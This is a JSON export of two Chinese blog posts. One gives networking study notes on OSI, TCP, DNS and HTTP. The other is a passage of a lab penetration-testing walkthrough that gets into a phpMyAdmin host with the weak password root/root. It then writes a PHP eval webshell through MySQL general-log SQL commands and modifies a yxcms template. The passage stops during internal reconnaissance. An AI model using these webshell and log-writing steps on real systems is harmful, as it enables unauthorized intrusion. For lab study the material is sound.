[{"content":"计算机网络与协议 2.1. 网络基础 2.1.1. 计算机通信网的组成 计算机网络由通信子网和资源子网组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。\n其中资源子网是计算机通信的本地系统环境，包括主机、终端和应用程序等， 资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载 均衡等。\n总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。\n2.1.2. 通信协议 为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。\n协议涉及到三个要素，分别为：\n语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义 语义：用于解释比特流的每一部分的意义 时序：事件实现顺序的详细说明 2.1.3. OSI七层模型 2.1.3.1. 简介 OSI（Open System Interconnection）共分为物理层、数据链路层、网络层、传输层、会话层、表示层、应用层七层，其具体的功能如下。\n2.1.3.2. 物理层 提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性 通过传输介质进行数据流(比特流)的物理传输、故障监测和物理层管理 从数据链路层接收帧，将比特流转换成底层物理介质上的信号 2.1.3.3. 数据链路层 在物理链路的两端之间传输数据 在网络层实体间提供数据传输功能和控制 提供数据的流量控制 检测和纠正物理链路产生的差错 格式化的消息称为帧 2.1.3.4. 网络层 负责端到端的数据的路由或交换，为透明地传输数据建立连接 寻址并解决与数据在异构网络间传输相关的所有问题 使用上面的传输层和下面的数据链路层的功能 格式化的消息称为分组 2.1.3.5. 传输层 提供无差错的数据传输 接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地 在系统之间提供可靠的透明的数据传输,提供端到端的错误恢复和流量控制 2.1.3.6. 会话层 提供节点之间通信过程的协调 负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接 使用上面的表示层和下面的传输层的功能 2.1.3.7. 表示层 提供数据格式、变换和编码转换 涉及正在传输数据的语法和语义 将消息以合适电子传输的格式编码 执行该层的数据压缩和加密 从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中 2.1.3.8. 应用层 包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等 2.1.3.9. 总结 低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（ hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由网络层来控制各条链路上的通信，但要依赖于其他节点的协调操作。\n高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。\n传输层是高三层和低三层之间的接口，它是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。\n2.2. UDP协议 2.2.1. 主要特点 协议开销小、效率高。 UDP是无连接的，即发送数据之前不需要建立连接。 UDP使用尽最大努力交付，即不保证可靠交付。 UDP没有拥塞控制。 UDP支持一对一、一对多、多对一和多对多交互通信。 UDP的首部开销小，只有8个字节。 2.3. TCP协议 2.3.1. 简介 TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由RFC 793定义。\n2.3.1.1. 三次握手 三次握手（Three-Way Handshake）是指建立一个TCP连接时，需要客户端和服务端总共发送3个包以确认连接的建立。\n第一次握手客户端将标志位 SYN 置为1，随机产生一个值 seq=s ，并将该数据包发送给服务端，客户端进入 SYN_SENT 状态，等待服务端确认。\n第二次握手服务端收到数据包后由标志位 SYN=1 知道客户端请求建立连接，服务端将标志位 SYN 和 ACK 都置为1，ack=s+1，随机产生一个值 seq=k ，并将该数据包发送给客户端以确认连接请求，服务端进入 SYN_RCVD 状态。\n第三次握手客户端收到确认后，检查ack值是否为s+1，ACK标志位是否为1，如果正确则将标志位 ACK 置为1，ack=k+1，并将该数据包发送给服务端，服务端检查ack值是否为k+1，ACK标志位是否为1，如果正确则连接建立成功，客户端和服务端进入 ESTABLISHED 状态，完成三次握手。\n2.3.1.2. 四次挥手 四次挥手（Four-Way Wavehand）指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。\n第一次挥手客户端发送一个 FIN ，用来关闭客户端到服务端的数据传送，客户端进入 FIN_WAIT_1 状态。\n第二次挥手服务端收到 FIN 后，发送一个 ACK 给客户端，确认序号为收到序号+1，服务端进入 CLOSE_WAIT 状态。\n第三次挥手服务端发送一个 FIN ，用来关闭服务端到客户端的数据传送，服务端进入 LAST_ACK 状态。\n第四次挥手客户端收到 FIN 后，客户端进入 TIME_WAIT 状态，接着发送一个 ACK 给服务端，确认序号为收到序号+1，服务端进入 CLOSED 状态，完成四次挥手。\n2.3.2. 拥塞控制 拥塞是指网络中报文数量过多，使得服务端来不及处理，以致引起这部分乃至整个网络性能下降的现象，严重时甚至会导致网络通信业务陷入停顿即出现死锁现象。\nTCP采用拥塞控制算法来减少或者避免拥塞现象的发生，TCP的拥塞算法有过多种实现，包括Tahoe、Reno、NewReno、Vegas、Hybla、BIC 、CUBIC、SACK、Westwood、PRR、BBR等。\n2.4. DHCP协议 2.4.1. 简介 动态主机配置协议 (Dynamic Host Configuration Protocol，DHCP) 是一个用于局域网的网络协议，位于OSI模型的应用层，使用UDP协议工作，主要用于自动分配IP地址给用户，方便管理员进行统一管理。\nDHCP服务器端使用67/udp，客户端使用68/udp。DHCP运行分为四个基本过程，分别为请求IP租约、提供IP租约、选择IP租约和确认IP租约。客户端在获得了一个IP地址以后，就可以发送一个ARP请求来避免由于DHCP服务器地址池重叠而引发的IP冲突。\n2.4.2. DCHP 报文格式 2.4.3. 参考链接 DHCP Wiki 2.4.3.1. RFC RFC 2131 Dynamic Host Configuration Protocol RFC 2132 DHCP Options and BOOTP Vendor Extensions RFC 3046 DHCP Relay Agent Information Option RFC 3397 Dynamic Host Configuration Protocol (DHCP) Domain Search Option RFC 3442 Classless Static Route Option for Dynamic Host Configuration Protocol (DHCP) version 4 RFC 3942 Reclassifying Dynamic Host Configuration Protocol Version Four (DHCPv4) Options RFC 4242 Information Refresh Time Option for Dynamic Host Configuration Protocol for IPv6 RFC 4361 Node-specific Client Identifiers for Dynamic Host Configuration Protocol Version Four (DHCPv4) RFC 4436 Detecting Network Attachment in IPv4 (DNAv4) 2.5. 路由算法 2.5.1. 简介 路由算法是用于找到一条从源路由器到目的路由器的最佳路径的算法。存在着多种路由算法，每种算法对网络和路由器资源的影响都不同；由于路由算法使用多种度量标准 (metric)，所以不同路由算法的最佳路径选择也有所不同。\n2.5.2. 路由选择算法的功能 源/宿对之间的路径选择，以及选定路由之后将报文传送到它们的目的地。\n路由选择算法的要求：\n正确性：确保分组从源节点传送到目的节点 简单性：实现方便，软硬件开销小 自适应性：也称健壮性，算法能够适应业务量和网络拓扑的变化 稳定性：能长时间无故障运行 公平性：每个节点都有机会传送信息 最优性：尽量选取好的路由 2.5.3. 自治系统 AS (Autonomous System) 经典定义：\n由一个组织管理的一整套路由器和网络。 使用一种AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由。 使用一种 AS 之间的路由选择协议用以确定分组在AS之间的路由。 尽管一个 AS 使用了多种内部路由选择协议和度量，但对其他 AS 表现出的是一个单一的和一致的路由选择策略。\n2.5.4. 两大类路由选择协议 因特网的中，路由协议可以分为内部网关协议 IGP (Interior Gateway Protocol)和外部网关协议 EGP (External Gateway Protocol)。\nIGP是在一个AS内部使用的路由选择协议，如RIP和OSPF协议，是域内路由选择 (interdomain routing)。当源主机和目的主机处在不同的AS中，在数据报到达AS的边界时，使用外部网关协议 EGP 将路由选择信息传递到另一个自治系统中，如BGP-4，是域间路由选择 (intradomain routing)。\n2.5.5. RIP 路由信息协议 (Routing Information Protocol, RIP) 是一种基于距离 向量的路由选择协议。RIP 协议要求网络中的每一个路由器都要维护从它自己到自治系统内其他每一个目的网络的距离和下一跳路由器地址。\n2.5.6. OSPF 开放最短路径优先(Open Shortest Path First，OSPF)，这个算法名为“最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF，只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。\n2.6. 域名系统 2.6.1. 简介 DNS是一个简单的请求-响应协议，是将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP协议的53端口。\n2.6.2. 请求响应 2.6.2.1. DNS记录 A\n返回域名对应的IPv4地址\nAAAA\nNS\n域名服务器返回该域名由哪台域名服务器解析\nPTR\n反向记录从IP地址到域名的记录\nMX\n电子邮件交换记录记录邮件域名对应的IP地址\n2.6.2.2. 响应码 NOERROR 1 No error condition FORMERR 1 Format error - The name server was unable to interpret the query SERVFAIL 1 Server failure - The name server was unable to process this query due to a problem with the name server NXDOMAIN 1 this code signifies that the domain name referenced in the query does not exist NOTIMP 1 Not Implemented - The name server does not support the requested kind of query REFUSED 1 Refused - The name server refuses to perform the specified operation for policy reasons NODATA 1 A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer. 2.6.3. 域名系统工作原理 2.6.3.1. 解析过程 DNS解析过程是递归查询的，具体过程如下：\n用户要访问域名www.example.com时，先查看本机hosts是否有记录或者本机是否有DNS缓存，如果有，直接返回结果，否则向递归服务器查询该域名的IP地址 递归缓存为空时，首先向根服务器查询com顶级域的IP地址 根服务器告知递归服务器com顶级域名服务器的IP地址 递归向com顶级域名服务器查询负责example.com的权威服务器的IP com顶级域名服务器返回相应的IP地址 递归向example.com的权威服务器查询www.example.com的地址记录 权威服务器告知www.example.com的地址记录 递归服务器将查询结果返回客户端 2.6.3.2. 域传送 DNS服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。\n2.6.4. 服务器类型 2.6.4.1. 根服务器 根服务器是DNS的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将DNS查询引导到相应的域名服务器。\n根服务器在域名树中代表最顶级的 . 域， 一般省略。\n13台IPv4根服务器的域名标号为a到m，即a.root-servers.org到m.root-servers.org，所有服务器存储的数据相同，仅包含ICANN批准的TLD域名权威信息。\n2.6.4.2. 权威服务器 权威服务器上存储域名Zone文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得DNS查询的资源记录。\n权威服务器需要在所承载的域名所属的TLD管理局注册，同一个权威服务器可以承载不同TLD域名，同一个域也可以有多个权威服务器。\n2.6.4.3. 递归服务器 递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的Hint文件。\n2.6.5. 加密方案 作为主流的防御方案，DNS加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over-HTTPS (DoH)、DNS-over-QUIC以及DNSCrypt。\n2.6.5.1. DoT DoT方案在2016年发表于RFC7858，使用853端口。主要思想是Client和Server通过TCP协议建立TLS会话后再进行DNS传输，Client通过SSL证书验证服务器身份。\n2.6.5.2. DNS-over-DTLS DNS-over-DTLS和DoT类似，区别在于使用UDP协议而不是TCP协议。\n2.6.5.3. DoH DoH方案在发表RFC8484，使用 https://dns.example.com/dns-query{?dns} 来查询服务器的IP，复用https的443端口，流量特征比较小。DoH会对DNS服务器进行加密认证，不提供fallback选项。目前Cloudflare、Google等服务商对DoH提供了支持。\n2.6.5.4. DNS-over-QUIC DNS-over-QUIC安全特性和DoT类似，但是性能更高，目前没有合适的软件实现。\n2.6.5.5. DNSCrypt DNSCrypt使用X25519-XSalsa20Poly1305而非标准的TLS，且DNSCrypt的Client需要额外的软件，Server需要的专门的证书。\n2.6.6. DNS利用 2.6.6.1. DGA DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C\u0026amp;C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。\n通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。\nDGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。\n2.6.6.2. DNS隧道 DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。\n2.6.7. RDAP RDAP (Registration Data Access Protocol) 协议是Whois协议的后继，和 Whois 协议类似，RDAP协议提供了域名、自治系统、IP地址的信息查询。\n2.6.8. 相关漏洞 2.6.8.1. DNS劫持 DNS劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造DNS响应的方法，来将域名解析到恶意的IP地址。\n随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。\n2.6.8.2. 拒绝服务 DNS服务通常会开启UDP端口，当DNS服务器拥有大量二级域NS记录时，通过DNS的UDP反射攻击可以实现高倍的拒绝服务。\n2.6.9. 相关机构 2.6.9.1. ICANN 互联网名称与数字地址分配机构 (Internet Corporation for Assigned Names and Numbers, ICANN) 创建于1998年9月18日，职能包括管理域名和IP地址的分配等与互联网相关的任务。\n2.6.9.2. IANA 互联网号码分配局 (Internet Assigned Numbers Authority, IANA) ，是一家互联网地址指派机构，管理国际互联网中使用的IP地址、域名和许多其它参数的机构。\n2.6.10. 术语 2.6.10.1. mDNS Multicast DNS (mDNS)，多播DNS，使用5353端口，组播地址为 224.0.0.251 或 [FF02::FB] 。在一个没有常规DNS服务器的小型网络内可以使用mDNS来实现类似DNS的编程接口、包格式和操作语义。mDNS协议的报文与DNS的报文结构相同，但有些字段对于mDNS来说有新的含义。\n启动mDNS的主机会在进入局域网后向所有主机组播消息，包含主机名、IP等信息，其他拥有相应服务的主机也会响应含有主机名和IP的信息。\nmDNS的域名是用 .local 和普通域名区分开的。\n2.6.10.2. FQDN FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如 www.example.com. 。\n2.6.10.3. TLD Top-Level Domain (TLD) 是属于根域的一个域，例如 com 或 jp 。\nTLD一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。\n2.6.10.4. IDN Internationalized Domain Names for Applications (IDNA) 是为了处理非ASCII字符的情况。\n2.6.10.5. CNAME CNAME即Canonical name，又称alias，将域名指向另一个域名。\n2.6.10.6. TTL Time To Live，无符号整数，记录DNS记录过期的时间，最小是0，最大是2147483647 (2^31 - 1)。\n2.6.11. 参考链接 2.6.11.1. RFC RFC 920 Domain Requirements RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION RFC 1123 Requirements for Internet Hosts \u0026ndash; Application and Support RFC 2535 Domain Name System Security Extensions RFC 2930 Secret Key Establishment for DNS (TKEY RR) RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s ) RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS) RFC 3755 DNS Extensions to Support IP Version 6 RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors RFC 5936 DNS Zone Transfer Protocol RFC 5966 DNS Transport over TCP - Implementation Requirements RFC 6376 DomainKeys Identified Mail (DKIM) Signatures RFC 6762 Multicast DNS RFC 6891 Extension Mechanisms for DNS (EDNS(0)) RFC 6895 DNS IANA Considerations RFC 7766 DNS Transport over TCP - Implementation Requirements RFC 7858 Specification for DNS over Transport Layer Security (TLS) RFC 7871 Client Subnet in DNS Queries RFC 8082 NXDOMAIN RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY RFC 8484 DNS Queries over HTTPS (DoH) RFC 8490 DNS Stateful Operations RFC 8499 DNS Terminology 2.6.11.1.1. Whois 相关 RFC 812 NICNAME/WHOIS RFC 954 NICNAME/WHOIS RFC 2167 Referral Whois (RWhois) Protocol V1.5 RFC 3912 WHOIS Protocol Specification RFC 7485 Inventory and Analysis of WHOIS Registration Objects 2.6.11.1.2. RDAP 相关 RFC7480 HTTP Usage in the Registration Data Access Protocol (RDAP) RFC7481 Security Services for the Registration Data Access Protocol (RDAP) RFC7484 Finding the Authoritative Registration Data (RDAP) Service RFC8056 Registration Data Access Protocol (RDAP) Object Tagging RFC9082 Registration Data Access Protocol (RDAP) Query Format RFC9083 JSON Responses for the Registration Data Access Protocol (RDAP) 2.6.11.2. 相关标准 Registration Data Access Protocol (RDAP) 2.6.11.3. 工具 Unbound bind9 2.6.11.4. 研究文章 DGA域名的今生前世：缘起、检测、与发展 DNSSEC原理和分析 Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278. An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come? 2.6.11.5. 相关CVE SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers 2.7. HTTP协议簇 2.7.1. HTTP标准 2.7.1.1. 报文格式 2.7.1.1.1. 请求报文格式 1 2 3 4 \u0026lt;method\u0026gt;\u0026lt;request-URL\u0026gt;\u0026lt;version\u0026gt; \u0026lt;headers\u0026gt; \u0026lt;entity-body\u0026gt; 2.7.1.1.2. 响应报文格式 1 2 3 4 \u0026lt;version\u0026gt;\u0026lt;status\u0026gt;\u0026lt;reason-phrase\u0026gt; \u0026lt;headers\u0026gt; \u0026lt;entity-body\u0026gt; 2.7.1.1.3. 字段解释 method\nHTTP动词常见方法：HEAD / GET / POST / PUT / DELETE / PATCH / OPTIONS / TRACE扩展方法：LOCK / MKCOL / COPY / MOVE\nversion\n报文使用的HTTP版本格式为HTTP/.\nurl\n\u0026lt;scheme\u0026gt;://\u0026lt;user\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;path\u0026gt;;\u0026lt;params\u0026gt;?\u0026lt;query\u0026gt;#\u0026lt;frag\u0026gt;\n2.7.1.2. 请求头列表 Accept\n指定客户端能够接收的内容类型Accept: text/plain, text/html\nAccept-Charset\n浏览器可以接受的字符编码集Accept-Charset: iso-8859-5\nAccept-Encoding\n指定浏览器可以支持的web服务器返回内容压缩编码类型Accept-Encoding: compress, gzip\nAccept-Language\n浏览器可接受的语言Accept-Language: en,zh\nAccept-Ranges\n可以请求网页实体的一个或者多个子范围字段Accept-Ranges: bytes\nAuthorization\nHTTP授权的授权证书Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\nCache-Control\n指定请求和响应遵循的缓存机制 Cache-Control: no-cache\nConnection\n表示是否需要持久连接 // HTTP 1.1默认进行持久连接Connection: close\nCookie\nHTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器Cookie: role=admin;ssid=1\nContent-Length\n请求的内容长度Content-Length: 348\nContent-Type\n请求的与实体对应的MIME信息Content-Type: application/x-www-form-urlencoded\nDate\n请求发送的日期和时间Date: Tue, 15 Nov 2010 08:12:31 GMT\nExpect\n请求的特定的服务器行为Expect: 100-continue\nFrom\n发出请求的用户的EmailFrom: user@email.com\nHost\n指定请求的服务器的域名和端口号Host: www.github.com\nIf-Match\n只有请求内容与实体相匹配才有效If-Match: \u0026ldquo;737060cd8c284d8af7ad3082f209582d\u0026rdquo;\nIf-Modified-Since\n如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT\nIf-None-Match\n如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变If-None-Match: \u0026ldquo;737060cd8c284d8af7ad3082f209582d\u0026rdquo;\nIf-Range\n如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为EtagIf-Range: \u0026ldquo;737060cd8c284d8af7ad3082f209582d\u0026rdquo;\nIf-Unmodified-Since\n只在实体在指定时间之后未被修改才请求成功If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT\nMax-Forwards\n限制信息通过代理和网关传送的时间Max-Forwards: 10\nPragma\n用来包含实现特定的指令Pragma: no-cache\nProxy-Authorization\n连接到代理的授权证书Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\nRange\n只请求实体的一部分，指定范围Range: bytes=500-999\nReferer\n先前网页的地址，当前请求网页紧随其后,即来路Referer: http://www.zcmhi.com/archives/71.html\nTE\n客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息TE: trailers,deflate;q=0.5\nUpgrade\n向服务器指定某种传输协议以便服务器进行转换（如果支持）Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11\nUser-Agent\nUser-Agent的内容包含发出请求的用户信息User-Agent: Mozilla/5.0 (Linux; X11)\nVia\n通知中间网关或代理服务器地址，通信协议Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)\nWarning\n关于消息实体的警告信息Warn: 199 Miscellaneous warning\n2.7.1.3. 响应头列表 Accept-Ranges\n表明服务器是否支持指定范围请求及哪种类型的分段请求Accept-Ranges: bytes\nAccess-Control-Allow-Origin\n配置有权限访问资源的域Access-Control-Allow-Origin: |*\nAge\n从原始服务器到代理缓存形成的估算时间（以秒计，非负）Age: 12\nAllow\n对某网络资源的有效的请求行为，不允许则返回405Allow: GET, HEAD\nCache-Control\n告诉所有的缓存机制是否可以缓存及哪种类型Cache-Control: no-cache\nContent-Encoding\nweb服务器支持的返回内容压缩编码类型。Content-Encoding: gzip\nContent-Language\n响应体的语言Content-Language: en,zh\nContent-Length\n响应体的长度Content-Length: 348\nContent-Location\n请求资源可替代的备用的另一地址Content-Location: /index.htm\nContent-MD5\n返回资源的MD5校验值Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==\nContent-Range\n在整个返回体中本部分的字节位置Content-Range: bytes 21010-47021/47022\nContent-Type\n返回内容的MIME类型Content-Type: text/html; charset=utf-8\nDate\n原始服务器消息发出的时间Date: Tue, 15 Nov 2010 08:12:31 GMT\nETag\n请求变量的实体标签的当前值ETag: \u0026ldquo;737060cd8c284d8af7ad3082f209582d\u0026rdquo;\nExpires\n响应过期的日期和时间Expires: Thu, 01 Dec 2010 16:00:00 GMT\nLast-Modified\n请求资源的最后修改时间Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT\nLocation\n用来重定向接收方到非请求URL的位置来完成请求或标识新的资源Location: http://www.zcmhi.com/archives/94.html\nPragma\n包括实现特定的指令，它可应用到响应链上的任何接收方Pragma: no-cache\nProxy-Authenticate\n它指出认证方案和可应用到代理的该URL上的参数Proxy-Authenticate: Basic\nRefresh\n应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）Refresh: 5; url=http://www.zcmhi.com/archives/94.html\nRetry-After\n如果实体暂时不可取，通知客户端在指定时间之后再次尝试Retry-After: 120\nServer\nweb服务器软件名称Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)\nSet-Cookie\n设置Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1\nStrict-Transport-Security\n设置浏览器强制使用HTTPS访问max-age: x秒的时间内 访问对应域名都使用HTTPS请求includeSubDomains: 网站的子域名也启用规则Strict-Transport-Security: max-age=1000; includeSubDomains\nTrailer\n指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards\nTransfer-Encoding\n文件传输编码Transfer-Encoding:chunked\nVary\n告诉下游代理是使用缓存响应还是从原始服务器请求Vary: *\nVia\n告知代理客户端响应是通过哪里发送的Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)\nWarning\n警告实体可能存在的问题Warning: 199 Miscellaneous warning\nWWW-Authenticate\n表明客户端请求实体应该使用的授权方案WWW-Authenticate: Basic\nX-Content-Type-Options\n配置禁止MIME类型嗅探X-Content-Type-Options: nosniff\nX-Frame-Options\n配置页面是否能出现在 , , , 等标签中，防止点击劫持X-Frame-Options: deny\nX-XSS-Protection\n配置XSS防护机制X-XSS-Protection: 1; mode=block\n2.7.1.4. HTTP状态返回代码 1xx（临时响应） 表示临时响应并需要请求者继续执行操作的状态代码。\nCode 代码 说明 100 继续 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分 101 切换协议 请求者已要求服务器切换协议，服务器已确认并准备切换 2.7.1.5. HTTP状态返回代码 2xx （成功） 表示成功处理了请求的状态代码。\nCode 代码 说明 200 成功 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页 201 已创建 请求成功并且服务器创建了新的资源 202 已接受 服务器已接受请求，但尚未处理 203 非授权信息 服务器已成功处理了请求，但返回的信息可能来自另一来源 204 无内容 服务器成功处理了请求，但没有返回任何内容 205 重置内容 m服务器成功处理了请求，但没有返回任何内容 206 部分内容 服务器成功处理了部分GET请求 2.7.1.6. HTTP状态返回代码 3xx （重定向） 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。\nCode 代码 说明 300 多种选择 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 永久移动 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 临时移动 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 查看其他位置 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 未修改 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。 305 使用代理 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 307 临时重定向 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 2.7.1.7. HTTP状态返回代码 4xx（请求错误） 这些状态代码表示请求可能出错，妨碍了服务器的处理。\nCode 代码 说明 400 错误请求 服务器不理解请求的语法。 401 未授权 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。 403 禁止 服务器拒绝请求。 404 未找到 服务器找不到请求的网页。 405 方法禁用 禁用请求中指定的方法。 406 不接受 无法使用请求的内容特性响应请求的网页。 407 需要代理授权 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 请求超时 服务器等候请求时发生超时。 409 冲突 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 410 已删除 如果请求的资源已永久删除，服务器就会返回此响应。 411 需要有效长度 服务器不接受不含有效内容长度标头字段的请求。 412 未满足前提条件 服务器未满足请求者在请求中设置的其中一个前提条件。 413 请求实体过大 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 请求的 URI 过长 请求的 URI（通常为网址）过长，服务器无法处理。 415 不支持的媒体类型 请求的格式不受请求页面的支持。 416 请求范围不符合要求 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 未满足期望值 服务器未满足\u0026quot;期望\u0026quot;请求标头字段的要求。 2.7.1.8. HTTP状态返回代码 5xx（服务器错误） 这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。\nCode 代码 说明 500 服务器内部错误 服务器遇到错误，无法完成请求。 501 尚未实施 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 502 错误网关 服务器作为网关或代理，从上游服务器收到无效响应。 503 服务不可用 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。 504 网关超时 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 HTTP 版本不受支持 服务器不支持请求中所用的 HTTP 协议版本。 ","date":"2025-05-24T07:19:37+08:00","permalink":"https://2477231995.github.io/p/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"Web安全学习笔记"},{"content":"1.环境搭建 参考以下文章,不做过多叙述\n\u0026lt;https://blog.csdn.net/m0_46363249/article/details/121441832\n2.拓扑图和机器信息 3.打点 端口扫描发现80站点和3306mysql服务\n访问http发现phpstudy探针\n使用hydra发现无法连接\n截包尝试爆破发现一个异常长度\n返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root\n尝试连接发现不允许从外部连接\n掏出82年的笔记,按理说phpstudy搭建应该有phpadmin\n访问路径发现的确存在\n使用弱口令root/root成功进入\n发现是能够执行sql语句的\n接下来我们尝试利用mysql 写入webshell\n1 2 3 4 5 6 7 8 #mysql写入webshell需要的条件 1.mysql用户为root或dba赋权较高用户 2.有写入权限(FILE) 3.知道网站的绝对路径 4.服务器配置secure_file_priv 该选项为空代表可以写入任何目录 该选项如果有目录则代表只允许写入该目录下文件 该选项为null代表没有权限 查询\u0026quot;secure_file_priv\u0026quot;\n发现为null就是没有写入权限\n查询一下日志功能,尝试利用日志getshell\n关闭了但是我们可以手动开启,输入sql语句SET GLOBAL general_log = ON;执行成功开启\n我这里偷窥了一下站点目录,这个应该记住!\n接下来的思路是设置日志文件写到一个php文件中,SET GLOBAL general_log_file = 'C:/phpstudy/WWW/test.php';\n1 2 #这里前面不能加@ select \u0026#39;\u0026lt;?php eval($_POST[gucheng]);?\u0026gt;\u0026#39;; 进来后发现还有个网站yxcms,我们练习都打一下\n棱洞扫了下发现这cms就叫这个\n查看网页源代码发现默认口令\n到指定路径输入默认口令成功登入,修改模版index_index.php\n写入一句马\n蚁剑成功连接\n4.内网渗透 之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点\n将生成马上传到站点目录下运行上线\nladon插件 icmp检测主机存活一致\n发现存在域环境,域名为god.org\nladon 